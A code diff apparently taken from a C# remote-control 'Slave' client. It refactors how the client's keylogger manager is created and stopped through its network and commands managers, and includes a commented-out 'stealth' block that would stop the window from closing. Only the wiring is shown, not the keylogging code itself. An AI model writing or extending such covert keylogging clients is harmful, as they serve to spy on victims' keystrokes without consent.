@@ -1,7 +1,6 @@
 ﻿using System.Threading.Tasks;
 using System.Windows;
 using Slave.Commands.Core;
-using Slave.Commands.KeyLogger;
 using Slave.Core;
 
 namespace Slave
@@ -11,24 +10,15 @@ namespace Slave
     /// </summary>
     public partial class MainWindow : Window
     {
-        /// <summary>
-        /// The keyLoggerManager must be instanciated from this thread
-        /// </summary>
-        public static KeyLoggerManager keyLoggerManager { get; set; }
-
+        SlaveManager manager { get; }
 
         public MainWindow()
         {
             InitializeComponent();
             
-            var manager = new SlaveManager();
-
+            manager = new SlaveManager();
             manager.networkManager = new SlaveNetworkManager();
             manager.commandsManager = new SlaveCommandsManager(manager.networkManager);
-
-            // Give the KeyloggerManager instance to the KeyLogger ISlaveCommand
-            keyLoggerManager = new KeyLoggerManager();
-            manager.commandsManager.PassKeyloggerManagerInstance(keyLoggerManager);
 
             // Start the processing in a new thread as a task
             Task mainTask;
@@ -46,13 +36,13 @@ namespace Slave
 
 
         /// <summary>
-        /// When the application is exiting, stop the keylogger
+        /// When the application is exiting, stop the keylogger (uninstall keyboard hooks)
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
         void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
         {
-            keyLoggerManager.Stop();
+            manager.commandsManager.StopKeylogger();
 
             // stealth
             /*e.Cancel = true;
